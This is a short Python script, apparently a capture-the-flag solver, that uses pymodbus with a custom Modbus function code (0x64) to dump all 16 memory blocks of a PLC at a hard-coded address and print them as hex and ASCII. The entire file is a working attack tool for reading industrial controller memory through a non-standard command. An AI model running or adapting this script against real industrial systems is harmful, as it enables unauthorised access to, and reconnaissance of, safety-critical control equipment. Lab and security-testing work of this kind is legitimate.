# plc_dump.py
# Dumps all 16 memory blocks from the PLC via custom Modbus FC 0x64
# Tested on: python 3.9.18, pymodbus==3.5.4

from pymodbus.client import ModbusTcpClient
from pymodbus.pdu import ModbusRequest, ModbusResponse
import struct
from pymodbus.transaction import ModbusSocketFramer

HOST_IP = '154.57.164.70'   # UPDATE
HOST_PORT = 32538            # UPDATE

CUSTOM_FC = 0x64
FC_READ   = 0x20

class CustomRequest(ModbusRequest):
    function_code = CUSTOM_FC
    def __init__(self, data=None, **kwargs):
        super().__init__(**kwargs)
        self.data = data if data is not None else []
    def encode(self):
        return struct.pack('B' * len(self.data), *self.data)
    def decode(self, data):
        pass

class CustomResponse(ModbusResponse):
    function_code = CUSTOM_FC
    def __init__(self, data=None, **kwargs):
        super().__init__(**kwargs)
        self.data = data if data is not None else []
    def encode(self):
        pass
    def decode(self, data):
        self.data = struct.unpack('>' + 'B' * len(data), data)

def send_packet(client, data):
    req = CustomRequest(data=data)
    resp = client.execute(req)
    if resp.function_code < 0x80:
        return resp.data
    return None

def read_block(client, block_num, length=255):
    addr = block_num * 1024
    addr_0 = (addr >> 16) & 0xFF
    addr_1 = (addr >> 8)  & 0xFF
    addr_2 =  addr        & 0xFF
    pkt = [0x00, FC_READ, addr_0, addr_1, addr_2, length]
    return send_packet(client, pkt)

client = ModbusTcpClient(HOST_IP, port=HOST_PORT, framer=ModbusSocketFramer)
client.framer.decoder.register(CustomResponse)

if client.connect():
    print("[+] Connected!")
    for block in range(16):
        print(f"\n[*] Reading block {block}...")
        data = read_block(client, block)
        if data:
            raw = bytes(data)
            print(f"    Hex:   {raw.hex()}")
            printable = ''.join(chr(b) if 32 <= b < 127 else '.' for b in raw)
            print(f"    ASCII: {printable}")
        else:
            print(f"    [!] No data / error")
    client.close()
else:
    print("[-] Connection failed")
